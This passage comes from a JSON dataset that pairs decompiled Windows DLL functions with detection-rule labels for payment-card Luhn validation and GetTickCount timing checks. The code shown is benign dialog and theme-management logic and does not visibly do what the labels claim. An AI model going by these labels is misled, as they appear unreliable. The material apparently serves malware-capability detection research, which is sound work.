        "decompiled_code": "\nulong fcn.18004bb00(int64_t arg1, ulong arg2, ulong arg3)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    ulong uVar3;\n    \n    iVar2 = (**0x1800de780)(arg3);\n    if (*(arg1 + 0x10) != 0) {\n        (**0x1800de0a8)();\n    }\n    if (iVar2 == 0x2714) {\n        (**0x1800de0a0)(arg2, *(arg1 + 0x18));\n    }\n    else {\n        if (iVar2 == 0x2717) {\n            (**0x1800de0a0)(arg2, *(arg1 + 0x1c));\n            uVar1 = *(arg1 + 0x1c);\n            goto code_r0x00018004bb8d;\n        }\n        if (iVar2 != 0x271b) {\n            return 0;\n        }\n        (**0x1800de0a0)(arg2, *(arg1 + 0x18));\n        (**0x1800de068)(arg2, *(arg1 + 0x1c));\n    }\n    uVar1 = *(arg1 + 0x18);\ncode_r0x00018004bb8d:\n    uVar3 = (**0x1800de0b0)(uVar1);\n    *(arg1 + 0x10) = uVar3;\n    return uVar3;\n}\n",
        "token_count": 329
    },
    "18004d87": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.18004d870(int64_t arg1)\n\n{\n    uint *puVar1;\n    code *pcVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint *puVar6;\n    uint *puVar7;\n    ulong ****ppppuVar8;\n    uint64_t uVar9;\n    uint *puVar10;\n    int64_t iVar11;\n    int64_t arg2;\n    int64_t iVar12;\n    uint *puVar13;\n    uchar auStack184 [32];\n    ulong uStack152;\n    ulong ****appppuStack136 [3];\n    uint64_t uStack112;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uchar auStack88 [16];\n    uint *puStack72;\n    uint64_t uStack56;\n    \n    uStack152 = 0xfffffffffffffffe;\n    uStack56 = *0x180123080 ^ auStack184;\n    (**0x1800de7f0)(*(arg1 + 0xb8), 0x184, 0, 0);\n    iVar11 = *(arg1 + 200);\n    iVar12 = *(arg1 + 0xd0);\n    if (iVar11 != iVar12) {\n        puVar13 = iVar11 + 0x20;\n        do {\n            ppppuVar8 = appppuStack136;\n            fcn.18000da90(ppppuVar8, iVar11);\n            uStack104 = *puVar13;\n            uStack100 = puVar13[1];\n            uStack96 = puVar13[2];\n            uStack92 = puVar13[3];\n            auStack88 = ZEXT816(0);\n            puStack72 = NULL;\n            puVar10 = *(puVar13 + 4);\n            puVar1 = *(puVar13 + 6);\n            if (puVar10 != puVar1) {\n                arg2 = puVar1 - puVar10 >> 4;\n                puVar6 = fcn.18001b980(ppppuVar8, arg2);\n                puStack72 = puVar6 + arg2 * 4;\n                puVar7 = puVar6;\n                do {\n                    uVar3 = puVar10[1];\n                    uVar4 = puVar10[2];\n                    uVar5 = puVar10[3];\n                    *puVar7 = *puVar10;\n                    puVar7[1] = uVar3;\n                    puVar7[2] = uVar4;\n                    puVar7[3] = uVar5;\n                    puVar7 = puVar7 + 4;\n                    puVar10 = puVar10 + 4;\n                } while (puVar10 != puVar1);\n                auStack88 = CONCAT88(puVar7, puVar6);\n            }\n            ppppuVar8 = appppuStack136;\n            if (7 < uStack112) {\n                ppppuVar8 = appppuStack136[0];\n            }\n            (**0x1800de7f0)(*(arg1 + 0xb8), 0x180, 0, ppppuVar8);\n            if (auStack88._0_8_ != NULL) {\n                uVar9 = puStack72 - auStack88._0_8_ & 0xfffffffffffffff0;\n                ppppuVar8 = auStack88._0_8_;\n                if ((0xfff < uVar9) && (ppppuVar8 = auStack88._0_8_[-1],  0x1f < auStack88._0_8_ + (-8 - ppppuVar8)))\n                goto code_r0x00018004daa5;\n                fcn.18008fb24(ppppuVar8);\n                auStack88 = ZEXT816(0);\n                puStack72 = NULL;\n            }\n            if (7 < uStack112) {\n                uVar9 = uStack112 * 2 + 2;\n                ppppuVar8 = appppuStack136[0];\n                if ((0xfff < uVar9) && (ppppuVar8 = appppuStack136[0][-1],  0x1f < appppuStack136[0] + (-8 - ppppuVar8))\n                   ) {\ncode_r0x00018004daa5:\n                    fcn.1800b3528(ppppuVar8, uVar9 + 0x27);\n                    pcVar2 = swi(3);\n                    (*pcVar2)();\n                    return;\n                }\n                fcn.18008fb24(ppppuVar8);\n            }\n            iVar11 = iVar11 + 0x48;\n            puVar13 = puVar13 + 0x12;\n        } while (iVar11 != iVar12);\n        iVar12 = *(arg1 + 0xd0);\n    }\n    iVar12 = iVar12 - *(arg1 + 200);\n    iVar11 = iVar12 >> 0x3f;\n    if (iVar12 / 0x48 + iVar11 != iVar11) {\n        (**0x1800de7f0)(*(arg1 + 0xb8), 0x186, 0, 0);\n    }\n    *(arg1 + 0xb5) = 0x101;\n    fcn.18004f110(arg1);\n    fcn.18008fb00(uStack56 ^ auStack184);\n    return;\n}\n",
        "token_count": 1212
    },
    "18004d24": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.18004d240(int64_t arg1)\n\n{\n    uchar (**arg1_00) [16];\n    uchar (*pauVar1) [16];\n    code *pcVar2;\n    int32_t iVar3;\n    ulong arg3;\n    ulong *puVar4;\n    uchar *arg1_01;\n    int64_t iVar5;\n    uchar (*arg1_02) [16];\n    uint64_t uVar6;\n    uint64_t uVar7;\n    uchar (*arg1_03) [16];\n    uint32_t uVar8;\n    uint64_t uVar9;\n    uchar auStack152 [32];\n    ulong uStack120;\n    uchar auStack104 [32];\n    uchar auStack72 [16];\n    int64_t iStack56;\n    uint64_t uStack48;\n    \n    uStack120 = 0xfffffffffffffffe;\n    uStack48 = *0x180123080 ^ auStack152;\n    auStack72 = ZEXT816(0);\n    uVar6 = 0;\n    iStack56 = 0;\n    arg1_01 = auStack104;\n    arg3 = fcn.18000da90(arg1_01, arg1 + 0x90);\n    iVar3 = fcn.180009c00(arg1_01, auStack72, arg3);\n    uVar7 = iVar3;\n    arg1_00 = arg1 + 200;\n    pauVar1 = *(arg1 + 0xd0);\n    arg1_02 = *arg1_00;\n    if (arg1_02 != pauVar1) {\n        do {\n            fcn.18004db60(arg1_02);\n            arg1_02 = arg1_02[4] + 8;\n        } while (arg1_02 != pauVar1);\n        arg1_02 = *arg1_00;\n    }\n    *(arg1 + 0xd0) = arg1_02;\n    pauVar1 = *arg1_00;\n    iVar5 = (arg1_02 - pauVar1) / 0x12 + (arg1_02 - pauVar1 >> 0x3f);\n    uVar9 = (iVar5 >> 2) - (iVar5 >> 0x3f);\n    if (uVar7 < uVar9) {\n        pauVar1 = pauVar1 + uVar7 * 0x48;\n        for (arg1_03 = pauVar1; arg1_03 != arg1_02; arg1_03 = arg1_03[4] + 8) {\n            fcn.18004db60(arg1_03);\n        }\n        *(arg1 + 0xd0) = pauVar1;\n    }\n    else if (uVar9 < uVar7) {\n        if ((*(arg1 + 0xd8) - pauVar1) / 0x48 < uVar7) {\n            fcn.1800522a0(arg1_00, uVar7);\n        }\n        else {\n            iVar5 = uVar7 - uVar9;\n            if (iVar5 != 0) {\n                puVar4 = arg1_02[2] + 8;\n                do {\n                    *arg1_02 = ZEXT816(0);\n                    arg1_02[1] = ZEXT816(0);\n                    arg1_02[2] = ZEXT816(0);\n                    arg1_02[3] = ZEXT816(0);\n                    *arg1_02[4] = 0;\n                    puVar4[-3] = 0;\n                    puVar4[-2] = 7;\n                    **arg1_02 = 0;\n                    puVar4[-1] = 0;\n                    *puVar4 = 0;\n                    puVar4[1] = 0;\n                    puVar4[2] = 0;\n                    puVar4[3] = 0;\n                    arg1_02 = arg1_02[4] + 8;\n                    puVar4 = puVar4 + 9;\n                    iVar5 = iVar5 + -1;\n                } while (iVar5 != 0);\n            }\n            *(arg1 + 0xd0) = arg1_02;\n        }\n    }\n    uVar7 = uVar6;\n    if (0 < iVar3) {\n        do {\n            fcn.18004d4a0(arg1, uVar7, auStack72._0_8_ + uVar6, arg1 + 0x90);\n            uVar8 = uVar7 + 1;\n            uVar6 = uVar6 + 0x20;\n            uVar7 = uVar8;\n        } while (uVar8 < iVar3);\n    }\n    if (auStack72._0_8_ != 0) {\n        fcn.180013aa0(auStack72._0_8_, auStack72._8_8_);\n        uVar6 = iStack56 - auStack72._0_8_ & 0xffffffffffffffe0;\n        iVar5 = auStack72._0_8_;\n        if (0xfff < uVar6) {\n            iVar5 = *(auStack72._0_8_ + -8);\n            if (0x1f < (auStack72._0_8_ - iVar5) - 8U) {\n                fcn.1800b3528(iVar5, uVar6 + 0x27);\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n        }\n        fcn.18008fb24(iVar5);\n    }\n    fcn.18008fb00(uStack48 ^ auStack152);\n    return;\n}\n",
        "token_count": 1258
    },
    "18004d4a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Variable defined which should be unmapped: var_21h\n// WARNING: Variable defined which should be unmapped: var_29h\n// WARNING: Variable defined which should be unmapped: var_31h\n// WARNING: Variable defined which should be unmapped: var_39h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.18004d4a0(int64_t arg1, ulong arg2, ulong *arg3, uint64_t **arg4)\n\n{\n    int64_t *arg1_00;\n    ulong *arg1_01;\n    code *pcVar1;\n    int64_t iVar2;\n    uint32_t uVar3;\n    uint64_t *puVar4;\n    ulong arg1_02;\n    uchar *puVar5;\n    uint64_t uVar6;\n    ulong *puVar7;\n    int64_t iVar8;\n    uint64_t uVar9;\n    uint64_t uVar10;\n    int64_t arg3_00;\n    uint64_t **arg2_00;\n    ulong var_fh;\n    uchar auStack264 [32];\n    uint64_t *puStack232;\n    uchar uStack216;\n    unkbyte7 Stack215;\n    ulong uStack200;\n    uint64_t uStack192;\n    uint64_t uStack184;\n    uint uStack176;\n    uint uStack172;\n    uint64_t *puStack168;\n    uint64_t uStack160;\n    uint64_t *puStack152;\n    ulong uStack144;\n    uchar auStack136 [7];\n    ulong var_79h;\n    ulong var_69h;\n    ulong var_61h;\n    ulong var_59h;\n    uint64_t var_49h;\n    ulong var_41h;\n    ulong var_39h;\n    ulong var_31h;\n    ulong var_29h;\n    ulong var_21h;\n    ulong var_1h;\n    int64_t iVar11;\n    \n    uStack144 = 0xfffffffffffffffe;\n    *NULL = *0x180123080 ^ auStack264;\n    arg1_01 = *(arg1 + 200) + arg2 * 0x48;\n    if (arg1_01 != arg3) {\n        puVar7 = arg3;\n        if (7 < arg3[3]) {\n            puVar7 = *arg3;\n        }\n        fcn.180010d70(arg1_01, puVar7, arg3[2]);\n    }\n    puStack152 = &uStack184;\n    puStack232 = fcn.18000da90(&uStack184, arg4);\n    uStack200 = CONCAT44(*0x180101914, *0x180101910);\n    uStack192 = CONCAT44(*0x18010191c, *0x180101918);\n    uStack216 = 0;\n    puVar5 = &uStack216;\n    fcn.180011120(puVar5, 0x1800f79ec, 3);\n    fcn.1800059e0(puVar5, arg3, &uStack216, arg1_01 + 4);\n    if (0xf < uStack192) {\n        iVar11 = CONCAT71(Stack215, uStack216);\n        iVar8 = iVar11;\n        if (0xfff < uStack192 + 1) {\n            iVar8 = *(iVar11 + -8);\n            if (0x1f < (iVar11 - iVar8) - 8U) {\n                fcn.1800b3528(iVar8, uStack192 + 0x28);\n                goto code_r0x00018004d868;\n            }\n        }\n        fcn.18008fb24(iVar8);\n    }\n    puStack152 = &var_79h + 1;\n    puVar4 = fcn.18000da90(&var_79h + 1, arg4);\n    uStack200 = CONCAT44(*0x180101914, *0x180101910);\n    uStack192 = CONCAT44(*0x18010191c, *0x180101918);\n    uStack216 = 0;\n    puVar5 = &uStack216;\n    fcn.180011120(puVar5, 0x1800f8344, 5);\n    puStack232 = puVar4;\n    arg1_02 = fcn.180005860(puVar5, &uStack184, arg3, &uStack216);\n    uVar3 = fcn.180067a70(arg1_02, 10);\n    uVar9 = uVar3;\n    puStack152 = puStack152 & 0xffffffff00000000 | uVar3;\n    if (7 < uStack160) {\n        uVar6 = uStack184;\n        if ((0xfff < uStack160 * 2 + 2) && (uVar6 = *(uStack184 - 8),  0x1f < (uStack184 - uVar6) - 8)) {\ncode_r0x00018004d868:\n            fcn.1800b3528();\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        fcn.18008fb24(uVar6);\n    }\n    puStack168 = *0x180101900;\n    uStack160 = *0x180101908;\n    uVar6 = 0;\n    uStack184 = uStack184 & 0xffffffffffff0000;\n    if (0xf < uStack192) {\n        iVar11 = CONCAT71(Stack215, uStack216);\n        iVar8 = iVar11;\n        if (0xfff < uStack192 + 1) {\n            iVar8 = *(iVar11 + -8);\n            if (0x1f < (iVar11 - iVar8) - 8U) {\n                fcn.1800b3528(*0x180101900, iVar8, uStack192 + 0x28);\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        fcn.18008fb24(iVar8);\n    }\n    arg1_00 = arg1_01 + 6;\n    puVar7 = *arg1_00;\n    arg1_01[7] = puVar7;\n    iVar8 = *arg1_00;\n    uVar10 = puVar7 - iVar8 >> 4;\n    if (uVar9 < uVar10) {\n        arg1_01[7] = uVar9 * 0x10 + iVar8;\n    }\n    else if (uVar10 < uVar9) {\n        if (arg1_01[8] - iVar8 >> 4 < uVar9) {\n            fcn.180052440(arg1_00, uVar9);\n        }\n        else {\n            for (iVar8 = uVar9 - uVar10; iVar8 != 0; iVar8 = iVar8 + -1) {\n                *puVar7 = 0;\n                puVar7[1] = 0;\n                puVar7 = puVar7 + 2;\n            }\n            arg1_01[7] = puVar7;\n        }\n    }\n    if (0 < uVar3) {\n        do {\n            fcn.180020af0(&var_59h + 1, 8, 0x1800fa268, uVar6);\n            _auStack136 = &uStack184;\n            puStack168 = NULL;\n            uStack160 = 0;\n            puVar4 = arg4[2];\n            arg2_00 = arg4;\n            if (0x7 < arg4[3]) {\n                arg2_00 = *arg4;\n            }\n            if (puVar4 < 0x8) {\n                uStack184 = *arg2_00;\n                uStack176 = *(arg2_00 + 1);\n                uStack172 = *(arg2_00 + 0xc);\n                uStack160 = 7;\n            }\n            else {\n                uVar9 = puVar4 | 7;\n                if (0x7ffffffffffffffe < uVar9) {\n                    uVar9 = 0x7ffffffffffffffe;\n                }\n                uStack184 = fcn.180011cf0(&uStack184, uVar9 + 1);\n                fcn.1800ade80(uStack184, arg2_00, puVar4 * 2 + 2);\n                uStack160 = uVar9;\n            }\n            iVar8 = *arg1_00;\n            uStack200 = 0;\n            uStack192 = 0xf;\n            uStack216 = 0;\n            iVar11 = -1;\n            do {\n                arg3_00 = iVar11 + 1;\n                iVar2 = iVar11 + 2;\n                iVar11 = arg3_00;\n            } while (*(&var_59h + iVar2) != '\\0');\n            puVar5 = &uStack216;\n            puStack168 = puVar4;\n            fcn.180011120(puVar5, &var_59h + 1, arg3_00);\n            puStack232 = &uStack184;\n            fcn.1800059e0(puVar5, arg3, &uStack216, uVar6 * 0x10 + iVar8);\n            if (0xf < uStack192) {\n                iVar11 = CONCAT71(Stack215, uStack216);\n                iVar8 = iVar11;\n                if (0xfff < uStack192 + 1) {\n                    iVar8 = *(iVar11 + -8);\n                    if (0x1f < (iVar11 - iVar8) - 8U) {\n                        fcn.1800b3528(iVar8, uStack192 + 0x28);\n                        pcVar1 = swi(3);\n                        (*pcVar1)();\n                        return;\n                    }\n                }\n                fcn.18008fb24(iVar8);\n            }\n            uVar3 = uVar6 + 1;\n            uVar6 = uVar3;\n        } while (uVar3 < puStack152);\n    }\n    fcn.18008fb00(stack0xffffffffffffffb0 ^ auStack264);\n    return;\n}\n",
        "token_count": 2250
    },
    "18004db6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.18004db60(int64_t *arg1)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    \n    iVar2 = arg1[6];\n    if (iVar2 != 0) {\n        uVar4 = arg1[8] - iVar2 & 0xfffffffffffffff0;\n        iVar3 = iVar2;\n        if (0xfff < uVar4) {\n            iVar3 = *(iVar2 + -8);\n            iVar2 = iVar2 - iVar3;\n            if (0x1f < iVar2 - 8U) goto code_r0x00018004dc0a;\n        }\n        fcn.18008fb24(iVar3);\n        arg1[6] = 0;\n        arg1[7] = 0;\n        arg1[8] = 0;\n    }\n    if (7 < arg1[3]) {\n        iVar2 = *arg1;\n        uVar4 = arg1[3] * 2 + 2;\n        iVar3 = iVar2;\n        if (0xfff < uVar4) {\n            iVar3 = *(iVar2 + -8);\n            iVar2 = iVar2 - iVar3;\n            if (0x1f < iVar2 - 8U) {\ncode_r0x00018004dc0a:\n                fcn.1800b3528(iVar2, uVar4 + 0x27);\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        fcn.18008fb24(iVar3);\n    }\n    arg1[2] = 0;\n    arg1[3] = 7;\n    *arg1 = 0;\n    return;\n}\n",
        "token_count": 391
    },
    "18004dc1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nushort * fcn.18004dc10(ulong noname_0, ushort *arg2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    ushort *puVar3;\n    ulong noname_0_00;\n    uint *arg1;\n    uint64_t uVar4;\n    uint uVar5;\n    uint *puStack64;\n    uint *puStack56;\n    uint *puStack48;\n    ulong uStack40;\n    ushort *puStack24;\n    \n    uStack40 = 0xfffffffffffffffe;\n    *(arg2 + 8) = 0;\n    *(arg2 + 0xc) = 7;\n    *arg2 = 0;\n    *(arg2 + 0x10) = 0;\n    *(arg2 + 0x14) = 0;\n    *(arg2 + 0x18) = 0;\n    *(arg2 + 0x1c) = 0;\n    *(arg2 + 0x20) = 0;\n    uVar5 = 1;\n    puStack24 = arg2;\n    fcn.180010d70(arg2, 0x1800f7bec, 0);\n    uVar5 = (**0x1800de7f0)(*0x18012a390, 0x843, 0, 0, uVar5);\n    noname_0_00 = *0x18012a390;\n    uVar2 = (**0x1800de7f0)(*0x18012a390, 0x842, 0, 0);\n    puStack64 = fcn.18001b980(noname_0_00, 1);\n    puStack56 = puStack64 + 4;\n    *puStack64 = uVar5;\n    puStack64[1] = uVar2;\n    puStack64[2] = 0;\n    puStack64[3] = 0;\n    puStack48 = puStack56;\n    fcn.180051da0(arg2 + 0x18, &puStack64);\n    if (puStack64 != NULL) {\n        uVar4 = puStack48 - puStack64 & 0xfffffffffffffff0;\n        arg1 = puStack64;\n        if (0xfff < uVar4) {\n            arg1 = *(puStack64 + -2);\n            if (0x1f < puStack64 + (-8 - arg1)) {\n                fcn.1800b3528(arg1, uVar4 + 0x27);\n                pcVar1 = swi(3);\n                puVar3 = (*pcVar1)();\n                return puVar3;\n            }\n        }\n        fcn.18008fb24(arg1);\n    }\n    return arg2;\n}\n",
        "token_count": 604
    },
    "18004ff7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18004ff70(int64_t arg1)\n\n{\n    char cVar1;\n    uint *arg2;\n    uchar auStack72 [32];\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint64_t uStack24;\n    \n    uStack24 = *0x180123080 ^ auStack72;\n    cVar1 = fcn.18004f040(arg1, &uStack40);\n    if (cVar1 == '\\0') {\n        uStack36 = 0;\n        uStack32 = 0;\n        uStack28 = 0;\n        uStack40 = (**0x1800de7f0)(*0x18012a390, 0x843, 0, 0);\n        (**0x1800de7f0)(*0x18012a390, 0x842, 0, 0);\n        arg2 = &uStack40;\n    }\n    else {\n        arg2 = CONCAT44(uStack36, uStack40);\n    }\n    fcn.18004b840(arg1 + 0x30, arg2);\n    fcn.18004fcf0(arg1);\n    fcn.18008fb00(uStack24 ^ auStack72);\n    return;\n}\n",
        "token_count": 283
    },
    "180050b7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180050b70(int64_t arg1)\n\n{\n    int64_t iVar1;\n    code *pcVar2;\n    char cVar3;\n    int64_t iVar4;\n    ulong ****ppppuVar5;\n    uint64_t uVar6;\n    uchar auStack152 [32];\n    ulong uStack120;\n    ulong ****appppuStack104 [3];\n    uint64_t uStack80;\n    ulong ****ppppuStack56;\n    ulong uStack48;\n    int64_t iStack40;\n    uint64_t uStack24;\n    \n    uStack120 = 0xfffffffffffffffe;\n    uStack24 = *0x180123080 ^ auStack152;\n    iVar4 = arg1;\n    cVar3 = fcn.180051230(arg1, 0);\n    if (cVar3 != '\\0') {\n        fcn.18004dc10(iVar4, appppuStack104);\n        iVar4 = *(arg1 + 0xd0);\n        if (iVar4 == *(arg1 + 0xd8)) {\n            fcn.180051e80(arg1 + 200, iVar4, appppuStack104);\n        }\n        else {\n            fcn.18004dab0(iVar4, appppuStack104);\n            *(arg1 + 0xd0) = *(arg1 + 0xd0) + 0x48;\n        }\n        iVar4 = *(arg1 + 0xd0);\n        iVar1 = *(arg1 + 200);\n        ppppuVar5 = appppuStack104;\n        if (7 < uStack80) {\n            ppppuVar5 = appppuStack104[0];\n        }\n        (**0x1800de7f0)(*(arg1 + 0xb8), 0x180, 0, ppppuVar5);\n        (**0x1800de7f0)(*(arg1 + 0xb8), 0x186, (iVar4 - iVar1) / 0x48 + -1, 0);\n        fcn.18004f110(arg1);\n        *(arg1 + 0xb5) = 0;\n        fcn.18004f340(arg1);\n        if (ppppuStack56 != NULL) {\n            uVar6 = iStack40 - ppppuStack56 & 0xfffffffffffffff0;\n            ppppuVar5 = ppppuStack56;\n            if ((0xfff < uVar6) && (ppppuVar5 = ppppuStack56[-1],  0x1f < ppppuStack56 + (-8 - ppppuVar5)))\n            goto code_r0x000180050d1b;\n            fcn.18008fb24(ppppuVar5);\n            ppppuStack56 = NULL;\n            uStack48 = 0;\n            iStack40 = 0;\n        }\n        if (7 < uStack80) {\n            uVar6 = uStack80 * 2 + 2;\n            ppppuVar5 = appppuStack104[0];\n            if ((0xfff < uVar6) && (ppppuVar5 = appppuStack104[0][-1],  0x1f < appppuStack104[0] + (-8 - ppppuVar5))) {\ncode_r0x000180050d1b:\n                fcn.1800b3528(ppppuVar5, uVar6 + 0x27);\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n            fcn.18008fb24(ppppuVar5);\n        }\n    }\n    fcn.18008fb00(uStack24 ^ auStack152);\n    return;\n}\n",
        "token_count": 823
    },
    "18005123": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.180051230(int64_t arg1, ulong arg2)\n\n{\n    char16_t *pcVar1;\n    uchar auStack264 [32];\n    uchar auStack232 [208];\n    uint64_t uStack24;\n    \n    uStack24 = *0x180123080 ^ auStack264;\n    if (0x3e6 < (*(arg1 + 0xd0) - *(arg1 + 200)) / 0x48) {\n        fcn.180020a90(auStack232, 100, L\"Only %i Themes can be defined.\", 999);\n        pcVar1 = L\"Add New Theme\";\n        if (arg2 != '\\0') {\n            pcVar1 = L\"Clone Selected Theme\";\n        }\n        (**0x1800de710)(*(arg1 + 0x18), auStack232, pcVar1, 0x10);\n    }\n    fcn.18008fb00(uStack24 ^ auStack264);\n    return;\n}\n",
        "token_count": 218
    },
    "180051da": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint64_t * fcn.180051da0(int64_t *arg1, int64_t *arg2)\n\n{\n    int64_t iVar1;\n    code *pcVar2;\n    int64_t *piVar3;\n    int64_t arg1_00;\n    uint64_t uVar4;\n    \n    if (arg1 != arg2) {\n        iVar1 = *arg1;\n        if (iVar1 != 0) {\n            uVar4 = arg1[2] - iVar1 & 0xfffffffffffffff0;\n            arg1_00 = iVar1;\n            if (0xfff < uVar4) {\n                arg1_00 = *(iVar1 + -8);\n                if (0x1f < (iVar1 - arg1_00) - 8U) {\n                    fcn.1800b3528(iVar1 - arg1_00, uVar4 + 0x27);\n                    pcVar2 = swi(3);\n                    piVar3 = (*pcVar2)();\n                    return piVar3;\n                }\n            }\n            fcn.18008fb24(arg1_00);\n            *arg1 = 0;\n            arg1[1] = 0;\n            arg1[2] = 0;\n        }\n        *arg1 = *arg2;\n        arg1[1] = arg2[1];\n        arg1[2] = arg2[2];\n        *arg2 = 0;\n        arg2[1] = 0;\n        arg2[2] = 0;\n    }\n    return arg1;\n}\n",
        "token_count": 341
    },
    "180051e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180051e40(ulong noname_0, int64_t arg2, int64_t arg3)\n\n{\n    if (arg2 != arg3) {\n        do {\n            fcn.18004db60(arg2);\n            arg2 = arg2 + 0x48;\n        } while (arg2 != arg3);\n    }\n    return;\n}\n",
        "token_count": 81
    },
    "1800521c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800521c0(int64_t *arg1, int64_t arg2, int64_t arg3, int64_t arg4)\n\n{\n    code *pcVar1;\n    uint64_t uVar2;\n    int64_t arg1_00;\n    int64_t iVar3;\n    \n    arg1_00 = *arg1;\n    if (arg1_00 != 0) {\n        iVar3 = arg1[1];\n        if (arg1_00 != iVar3) {\n            do {\n                fcn.18004db60(arg1_00);\n                arg1_00 = arg1_00 + 0x48;\n            } while (arg1_00 != iVar3);\n            arg1_00 = *arg1;\n        }\n        uVar2 = ((arg1[2] - arg1_00) / 0x48) * 0x48;\n        iVar3 = arg1_00;\n        if (0xfff < uVar2) {\n            iVar3 = *(arg1_00 + -8);\n            if (0x1f < (arg1_00 - iVar3) - 8U) {\n                fcn.1800b3528(arg1[2] - arg1_00, uVar2 + 0x27);\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        fcn.18008fb24(iVar3);\n    }\n    *arg1 = arg2;\n    arg1[1] = arg2 + arg3 * 0x48;\n    arg1[2] = arg2 + arg4 * 0x48;\n    return;\n}\n",
        "token_count": 366
    },
    "18005265": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180052650(code **arg1)\n\n{\n    *arg1 = vtable.PreferencesDialog.0;\n    if (arg1[6] != NULL) {\n        (**0x1800de0a8)();\n    }\n    *arg1 = vtable.StaticDialog.0;\n    if (arg1[3] != NULL) {\n        (**0x1800de7d8)(arg1[3], 0xffffffeb);\n        (**0x1800de7f0)(arg1[2], 0x7f4, 1, arg1[3]);\n    // WARNING: Could not recover jumptable at 0x0001800526b4. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**0x1800de680)(arg1[3]);\n        return;\n    }\n    return;\n}\n",
        "token_count": 187
    },
    "18005275": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.180052750(code **arg1)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code *arg1_00;\n    \n    pcVar1 = arg1[9];\n    if (0xf < pcVar1) {\n        pcVar2 = arg1[6];\n        arg1_00 = pcVar2;\n        if (0xfff < pcVar1 + 1) {\n            arg1_00 = *(pcVar2 + -8);\n            if (0x1f < (pcVar2 - arg1_00) - 8U) {\n                fcn.1800b3528(pcVar2 - arg1_00, pcVar1 + 0x28);\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        fcn.18008fb24(arg1_00);\n    }\n    arg1[8] = NULL;\n    arg1[9] = 0xf;\n    *(arg1 + 6) = 0;\n    *arg1 = vtable.StaticDialog.0;\n    if (arg1[3] == NULL) {\n        return;\n    }\n    (**0x1800de7d8)(arg1[3], 0xffffffeb);\n    (**0x1800de7f0)(arg1[2], 0x7f4, 1, arg1[3]);\n    // WARNING: Could not recover jumptable at 0x0001800527e6. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**0x1800de680)(arg1[3]);\n    return;\n}\n",
        "token_count": 362
    },
    "18005284": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
